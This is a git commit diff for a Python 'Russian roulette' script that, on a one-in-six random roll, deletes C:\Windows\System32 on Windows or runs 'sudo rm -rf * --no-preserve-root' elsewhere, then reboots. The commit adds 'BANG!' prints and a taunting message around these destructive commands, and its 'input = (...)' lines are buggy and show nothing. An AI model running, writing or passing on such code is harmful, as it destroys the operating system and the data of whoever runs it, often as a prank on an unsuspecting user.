0759343f7e1baa33e95d5af33f7ae18232c3b9e1
Mason <masoncodes0@gmail.com>
2017-02-07 20:44:44 -0600

    Update Roulette.py

--- Roulette.py
+++ Roulette.py
@@ -9,12 +9,16 @@ spin = random.randint(1, 6)
 
 if os.name == "nt":
     if spin == 6:
+        print("BANG!")
         shutil.rmtree("C:\Windows\System32")
+        input = ("If you're reading this it's too late")
         os.system('shutdown -r')
     else:
         print("Click.")
 
 else:
     if spin == 6:
+        print("BANG!")
         os.system('sudo rm -rf * --no-preserve-root')
+        input = ("If you're reading this it's too late")
         os.system('sudo reboot')
